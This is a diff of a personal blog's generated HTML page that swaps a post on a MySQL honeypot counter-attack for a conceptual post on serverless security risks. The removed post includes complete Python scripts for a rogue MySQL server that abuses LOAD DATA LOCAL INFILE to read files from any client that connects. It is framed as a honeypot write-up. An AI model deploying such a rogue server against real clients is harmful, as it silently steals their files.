@@ -20,36 +20,28 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="Mysql登录分析 命令行登录Mysql，并抓包，可以看到   首先对Mysql版本进行验证   接着Request login，传输用户名和密码hash   登录成功，返回OK  查询版本号并返回   当执行一条语句时，抓包如下，可以看到查询语句明文传输      Navicat登录分析 登录流程和命令行登录差不多，多了几次Query     流程如下    Mysql特性 Mysql 默认打开">
+    <meta name="description" content="这篇文章是对学习云原生及实习中做的一些工作的阶段性总结。 何为Iaas，Paas，Saas,引用知乎的一个高赞回答，可以理解为iaas作为云服务的第一个阶段，由云计算厂商统筹管理硬件资源，由客户来进行使用。用户需购买服务器并自己安装软件配置环境上传代码等开发运维工作 而PaaS由云厂商封装好应用的环境变量等配置信息由用户上传代码使用即可，这种和容器有异曲同工之处。SaaS即厂商软件也给你封装好，直">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Mysql蜜罐反制">
-<meta property="og:url" content="http://example.com/2022/08/09/mysql%E8%9C%9C%E7%BD%90%E5%8F%8D%E5%88%B6/index.html">
+<meta property="og:title" content="Serverless及其安全风险">
+<meta property="og:url" content="http://example.com/2023/07/19/serverless/index.html">
 <meta property="og:site_name" content="s1eep123のblog">
-<meta property="og:description" content="Mysql登录分析 命令行登录Mysql，并抓包，可以看到   首先对Mysql版本进行验证   接着Request login，传输用户名和密码hash   登录成功，返回OK  查询版本号并返回   当执行一条语句时，抓包如下，可以看到查询语句明文传输      Navicat登录分析 登录流程和命令行登录差不多，多了几次Query     流程如下    Mysql特性 Mysql 默认打开">
+<meta property="og:description" content="这篇文章是对学习云原生及实习中做的一些工作的阶段性总结。 何为Iaas，Paas，Saas,引用知乎的一个高赞回答，可以理解为iaas作为云服务的第一个阶段，由云计算厂商统筹管理硬件资源，由客户来进行使用。用户需购买服务器并自己安装软件配置环境上传代码等开发运维工作 而PaaS由云厂商封装好应用的环境变量等配置信息由用户上传代码使用即可，这种和容器有异曲同工之处。SaaS即厂商软件也给你封装好，直">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101158426.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101345553.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101455841.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101557032.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101814721.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101838335.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830102246191.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830102317294.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830110305792.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830105755554.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830105956274.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830110114832.png">
-<meta property="article:published_time" content="2022-08-09T13:16:50.000Z">
-<meta property="article:modified_time" content="2022-09-01T02:40:48.050Z">
+<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20230719230154123.png">
+<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20230719230208266.png">
+<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20230719230222246.png">
+<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20230719230236027.png">
+<meta property="article:published_time" content="2023-07-19T14:52:06.714Z">
+<meta property="article:modified_time" content="2023-07-19T15:03:47.531Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="攻防">
+<meta property="article:tag" content="虚拟化">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101158426.png">
+<meta name="twitter:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20230719230154123.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
     
-    <title>Mysql蜜罐反制 · s1eep123&#39;s blog</title>
+    <title>Serverless及其安全风险 · s1eep123&#39;s blog</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -275,7 +267,7 @@
                 <a href="/">s1eep123&#39;s blog.</a>
             </div>
             <div class="post-title header-element">
-                <a href="#" class="post-name">Mysql蜜罐反制</a>
+                <a href="#" class="post-name">Serverless及其安全风险</a>
             </div>
         </div>
     
@@ -321,7 +313,7 @@
         <h1 class="intro-title">
             <!-- 主页  -->
             
-                Mysql蜜罐反制
+                Serverless及其安全风险
             <!-- 404 -->
             
         </h1>
@@ -345,28 +337,28 @@
             
         
         
-        <span class="post-category" data-categories="红蓝攻防"">
+        <span class="post-category" data-categories="虚拟化"">
             <i class="fas fa-folder post-category-icon"></i>
             <span class="post-category-text">
-                红蓝攻防
+                虚拟化
             </span>
         </span>
     
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="攻防">攻防</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="虚拟化">虚拟化</a>
     
 </div>
 
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">857</span>Reading time: <span class="post-count reading-time">4 min</span></span>
+                        <span>Word count: <span class="post-count word-count">1.7k</span>Reading time: <span class="post-count reading-time">6 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <!-- 撰写日期 -->
                     <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2022/08/09</span>
+                    <span class="post-intro-time">2023/07/19</span>
                     <!-- busuanzi -->
                     
                         <span id="busuanzi_container_page_pv" class="busuanzi-pv">
@@ -521,73 +513,39 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <h4 id="Mysql登录分析"><a href="#Mysql登录分析" class="headerlink" title="Mysql登录分析"></a>Mysql登录分析</h4><ol>
-<li><p>命令行登录Mysql，并抓包，可以看到</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101158426.png" alt=" "></p>
-</li>
-<li><p>首先对Mysql版本进行验证</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101345553.png" alt="image-20220830101345553"></p>
-</li>
-<li><p>接着Request login，传输用户名和密码hash</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101455841.png" alt="image-20220830101455841"></p>
-</li>
-<li><p>登录成功，返回OK</p>
-</li>
-<li><p>查询版本号并返回</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101557032.png" alt="image-20220830101557032"></p>
-</li>
-<li><p>当执行一条语句时，抓包如下，可以看到查询语句明文传输</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101814721.png" alt="image-20220830101814721"> </p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101838335.png" alt="image-20220830101838335"></p>
-</li>
-</ol>
-<h4 id="Navicat登录分析"><a href="#Navicat登录分析" class="headerlink" title="Navicat登录分析"></a>Navicat登录分析</h4><ol>
-<li><p>登录流程和命令行登录差不多，多了几次Query</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830102246191.png" alt="image-20220830102246191"> </p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830102317294.png" alt="image-20220830102317294"></p>
-</li>
-<li><p>流程如下</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830110305792.png" alt="image-20220830110305792"></p>
-</li>
-</ol>
-<h4 id="Mysql特性"><a href="#Mysql特性" class="headerlink" title="Mysql特性"></a>Mysql特性</h4><ol>
-<li><pre><code class="mysql">Mysql 默认打开local_infile，如为打开可执行下列命令
-show global variables like&#39;local_infile&#39;;
-set global local_infile=1;
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. MySQL服务端可以利用`LOAD DATA LOCAL`命令来读取`MYSQL`客户端的任意文件，然后伪造恶意服务器向连接到这个服务器的客户端发送读取文件的`payload`。</span><br><span class="line"></span><br><span class="line">3. 本地执行命令</span><br><span class="line"></span><br><span class="line">   ```mysql</span><br><span class="line">   load data local infile &#x27;C:/Users/royal/Desktop/pass/passwd.txt&#x27; into table test.test1 fields terminated by &#x27;\n&#x27;;</span><br></pre></td></tr></table></figure>
-
-![image-20220830105153036](https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830105153036.png)
-</code></pre>
-</li>
-<li><p>可以看到成功读取数据并写入表中</p>
-</li>
-</ol>
-<h4 id="命令分析"><a href="#命令分析" class="headerlink" title="命令分析"></a>命令分析</h4><ol>
-<li><p>抓包</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830105755554.png" alt="image-20220830105755554"> </p>
-</li>
-<li><p>执行query查询，重点看下返回包</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830105956274.png" alt="image-20220830105956274"></p>
-</li>
-<li><p>接着读取文件内容并写入</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830110114832.png" alt="image-20220830110114832"></p>
-</li>
-</ol>
-<h4 id="反制"><a href="#反制" class="headerlink" title="反制"></a>反制</h4><ol>
-<li><p>反制流程也很明了了，就是socket编程模拟navicat登录，然后服务端(蜜罐)发送load local file payload即可</p>
-</li>
-<li><p>脚本如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 模拟Mysql登录</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line"></span><br><span class="line">port = <span class="number">3306</span></span><br><span class="line">serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">serversocket.bind((<span class="string">&quot;&quot;</span>, port))</span><br><span class="line">serversocket.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 建立客户端连接</span></span><br><span class="line">    clientsocket,addr = serversocket.accept()      </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;连接地址: %s&quot;</span> % <span class="built_in">str</span>(addr))</span><br><span class="line">    <span class="comment"># 返回版本信息</span></span><br><span class="line">    version_text = <span class="string">b&quot;\x4a\x00\x00\x00\x0a\x38\x2e\x30\x2e\x31\x32\x00\x08\x00\x00\x00\x2a\x51\x47\x38\x48\x17\x12\x21\x00\xff\xff\xc0\x02\x00\xff\xc3\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7a\x6f\x6e\x25\x61\x3e\x48\x31\x25\x43\x2b\x61\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;</span></span><br><span class="line">    clientsocket.sendall(version_text)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 客户端请求信息</span></span><br><span class="line">        clientsocket.recv(<span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="comment"># Response OK</span></span><br><span class="line">    verification = <span class="string">b&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;</span></span><br><span class="line">    clientsocket.sendall(verification)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># SET NAMES utf8mb4</span></span><br><span class="line">        clientsocket.recv(<span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="comment"># Response TABULAR</span></span><br><span class="line">    evil_response = <span class="string">b&quot;\x09\x00\x00\x01\xfb\x43\x3a\x2f\x31\x2e\x74\x78\x74&quot;</span></span><br><span class="line">    clientsocket.sendall(evil_response)</span><br><span class="line">    <span class="comment"># file_text</span></span><br><span class="line">    <span class="built_in">print</span>(clientsocket.recv(<span class="number">9999</span>))</span><br><span class="line">    clientsocket.close()</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 反制脚本 读取C:\\Windows\\PFRO.log文件</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">port = <span class="number">3306</span></span><br><span class="line">server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">server.bind((<span class="string">&quot;&quot;</span>, port))</span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">filename, client, addr</span>):</span><br><span class="line">    base_path = os.path.abspath(<span class="string">&#x27;.&#x27;</span>) + <span class="string">&quot;/log/&quot;</span> + addr[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(base_path):</span><br><span class="line">        os.makedirs(base_path)</span><br><span class="line"></span><br><span class="line">    evil_response = <span class="built_in">str</span>.encode(<span class="built_in">chr</span>(<span class="built_in">len</span>(filename)+<span class="number">1</span>)) + <span class="string">b&quot;\x00\x00\x01\xfb&quot;</span> + <span class="built_in">str</span>.encode(filename)  <span class="comment"># 恶意响应包    </span></span><br><span class="line">    client.sendall(evil_response)</span><br><span class="line">    file_data = client.recv(<span class="number">999999</span>)</span><br><span class="line">    <span class="built_in">print</span>(file_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(base_path + <span class="string">&quot;/&quot;</span> + filename.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;_&quot;</span>).replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>), <span class="string">&quot;wb+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(file_data)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 建立客户端连接</span></span><br><span class="line">    client, addr = server.accept()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;连接地址: %s&quot;</span> % <span class="built_in">str</span>(addr))</span><br><span class="line">    <span class="comment"># 返回版本信息</span></span><br><span class="line">    version_text = <span class="string">b&quot;\x4a\x00\x00\x00\x0a\x38\x2e\x30\x2e\x31\x32\x00\x08\x00\x00\x00\x2a\x51\x47\x38\x48\x17\x12\x21\x00\xff\xff\xc0\x02\x00\xff\xc3\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7a\x6f\x6e\x25\x61\x3e\x48\x31\x25\x43\x2b\x61\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;</span></span><br><span class="line">    client.sendall(version_text)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 客户端请求信息</span></span><br><span class="line">        client.recv(<span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="comment"># Response OK</span></span><br><span class="line">    verification = <span class="string">b&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;</span></span><br><span class="line">    client.sendall(verification)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># SET NAMES utf8mb4</span></span><br><span class="line">        client.recv(<span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Response TABULAR</span></span><br><span class="line">    filename = <span class="string">&quot;C:\\Windows\\PFRO.log&quot;</span></span><br><span class="line">    <span class="comment">#这里为要读取的文件路径</span></span><br><span class="line">    get_data(filename, client, addr)</span><br><span class="line">    client.close()</span><br></pre></td></tr></table></figure></li>
-</ol>
+        <p>这篇文章是对学习云原生及实习中做的一些工作的阶段性总结。</p>
+<p>何为Iaas，Paas，Saas,引用知乎的一个高赞回答，可以理解为iaas作为云服务的第一个阶段，由云计算厂商统筹管理硬件资源，由客户来进行使用。用户需购买服务器并自己安装软件配置环境上传代码等开发运维工作</p>
+<p>而PaaS由云厂商封装好应用的环境变量等配置信息由用户上传代码使用即可，这种和容器有异曲同工之处。SaaS即厂商软件也给你封装好，直接进行使用即可。</p>
+<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20230719230154123.png" alt="image-20230719230154123"></p>
+<p>而serverless提供了一种更简洁更方便的云服务方式，无服务器即用户不需要再像往常一样考虑服务器方面的问题，比如服务器的维护，漏洞更新，网络带宽，缩扩容，软件环境配置等。而是提供了FaaS（Function as a Service）函数即服务，Baas（Backend as a Service）后端即服务的概念。实现各类 Web 框架快速创建、迁移上云，可以实现Express、Next.js、Python Flask、PHP Laravel、Koa、Egg.js、Nuxt.js等框架应用的快速部署（从腾讯云官网可以看到）。</p>
+<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20230719230208266.png" alt="image-20230719230208266"></p>
+<p>FaaS本质上是一种事件驱动并由消息触发的服务，事件类型可以是一个HTTP请求，也可以是一次用户操作，函数可以看作是完成某个功能或任务的代码片段。相比传统应用运行模式，Serverless业务代码被拆分成了函数粒度，不同函数表示不同的功能，函数之间调用关系也更加复杂。以下是腾讯云提供的函数服务</p>
+<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20230719230222246.png" alt="image-20230719230222246"></p>
+<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20230719230236027.png" alt="image-20230719230236027"></p>
+<p>可以看到Faas类似于云api的功能，用户只需调用api接口即可实现相关服务。</p>
+<p>BaaS可以理解为是一个整合和开放各种在应用开发中需要的服务能力的平台，它通过创建大量重复的代码功能，方便应用基于服务的快速开发和构建。这里的后端，指的就是各种云产品和云服务，例如对象存储COS，消息队列CMQ，云数据库CDB、TDSQL，云缓存CRedis等。这些产品或服务，用户直接开通即可使用。</p>
+<p>serverless的安全风险</p>
+<p>由于后端及基础设施是由云厂商进行维护的。对于云厂商来说，首先需要保障云基础环境安全，包括所有的底层基础设施和后端服务软件的安全性。同时云厂商也担负着Serverless平台应用整体安全防护责任，借助API网关、云防护等优势来保障Serverless应用安全。对于用户来说，需要保证上传到服务端的代码是安全的、同时确保应用策略配置安全，避免代码中存在漏洞或策略配置不当导致安全风险。所以从本质上来说，Serverless的安全性是需要云厂商和用户双方共同承担的</p>
+<p>对于用户方面，SQL注入，XSS，命令执行等传统攻击方式在serverless中依旧存在，因此更多关注云厂商所需的安全工作</p>
+<p>拒绝钱包攻击</p>
+<p>DoW（Denial of Wallet,拒绝钱包攻击）是针对云平台账户的DoS方式，其目的是通过高并发来耗尽用户账户可用余额。DoW攻击与传统拒绝服务(DoS)攻击方式类似，恶意攻击者向通过构造大量并发请求来触发函数调用，由于Serverless是按照资源使用量和函数调用次数来收费的，当有大量调用产生时，服务会自动扩展，这将导致用户账户可用余额快速被消耗。DoW攻击的一个典型的场景是在用户订阅web程序上生成大量虚假用户，通过大量用户访问API端点造成大量资源消耗导致账户金额耗尽。</p>
+<p>资源滥用风险</p>
+<p>近年来，随着Severless的快速发展，各种服务滥用现象也相继出现，主要体现在云函数滥用和Serverless基础设施滥用。云函数常被恶意人员用作构建代理池、隐藏C2和构建webshell，恶意人员通过构建此类应用来达到隐藏其客户端真实IP的目的。Serverless应用也常被用于构建扫描、钓鱼等攻击平台，攻击者通过构建此类应用来实现对外部系统的扫描探测、钓鱼窃取用户数据等目的。这些滥用行为导致云基础设施资源被恶意利用和消耗，给云服务的正常使用和监测带来了极大的困扰。</p>
+<p>第三方API和组件不安全接入</p>
+<p>由于Serverless服务一般会接入多个云服务组件，包括云API、API网关、事件触发器等。若云服务或组件在接入Serverless服务时未对组件身份或接收数据进行校验，则可能导致安全风险的发生。接入数据源的增加会导致攻击面扩大，传统应用只能从单一服务器上获取敏感数据，而Serverless应用通常会接入大量数据源，若攻击者针对各数据源进行攻击，则可能获取到大量敏感数据。</p>
+<p>运行时安全风险</p>
+<p>若攻击者已经通过某种方式获得了Serverless服务器权限后，则可能通过替换引导程序的方式攻击Serverless应用服务，从而导致Serverless应用实例被接管。如果攻击者可以修改Serverless ACL策略，则可以通过修改函数超时时间，增加服务冷启动时间，或者通过Serverless预热插件增加运行时时长等方式实现持久化控制。</p>
+<p>日志和监控不足</p>
+<p>传统的应用已经有比较成熟的日志管理和分析工具，而Serverless函数级别的日志分析工具还未被广泛采用。由于Serverless应用函数数量多、生命周期短，各函数间调用关系复杂，因此任何一个点都可能成为攻击突破口。对于云厂商来说，需要具备完备的安全防护和应用监测体系，才能更好的保障Serverless应用和服务的安全。</p>
+<p>云环境网络攻击风险</p>
+<p>攻击者可利用漏洞或错误的云平台架构配置，从公有云环境横向移动到云管理内部网络(如公有云到IDC网络)；或者从公有云网络横向移动到客户构建的网络环境中，导致严重的攻击事件产生。</p>
 
     </article>
     <!-- license -->
     
         <div class="license-wrapper">
-            <p>Publish date：<a href="http://example.com/2022/08/09/mysql%E8%9C%9C%E7%BD%90%E5%8F%8D%E5%88%B6/">August 9th 2022, 9:16:50 pm</a>
-            <p>Update date：<a href="http://example.com/2022/08/09/mysql%E8%9C%9C%E7%BD%90%E5%8F%8D%E5%88%B6/">September 1st 2022, 10:40:48 am</a>
+            <p>Publish date：<a href="http://example.com/2023/07/19/serverless/">July 19th 2023, 10:52:06 pm</a>
+            <p>Update date：<a href="http://example.com/2023/07/19/serverless/">July 19th 2023, 11:03:47 pm</a>
             <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -596,16 +554,16 @@ set global local_infile=1;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href="/2022/08/09/docker%E4%BD%BF%E7%94%A8/" title="docker使用">
-                    <div class="nextTitle">docker使用</div>
+                <a href="/2023/07/19/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%90%AF%E5%8A%A8%E5%A4%B1%E8%B4%A5%E8%B0%83%E8%AF%95/" title="记一次虚拟机启动失败调试过程">
+                    <div class="nextTitle">记一次虚拟机启动失败调试过程</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2022/08/06/lab9-1/" title="恶意代码分析lab9-1">
-                    <div class="prevTitle">恶意代码分析lab9-1</div>
+                <a href="/2023/07/01/kvm%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-cpu%E8%99%9A%E6%8B%9F%E5%8C%96/" title="KVM架构原理-CPU虚拟化">
+                    <div class="prevTitle">KVM架构原理-CPU虚拟化</div>
                 </a>
             
         </li>
@@ -752,7 +710,7 @@ set global local_infile=1;
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">Mysql登录分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navicat%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">Navicat登录分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql%E7%89%B9%E6%80%A7"><span class="toc-number">3.</span> <span class="toc-text">Mysql特性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">命令分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%88%B6"><span class="toc-number">5.</span> <span class="toc-text">反制</span></a></li></ol>
+                
             </div>
         
         <!-- sidebar -->
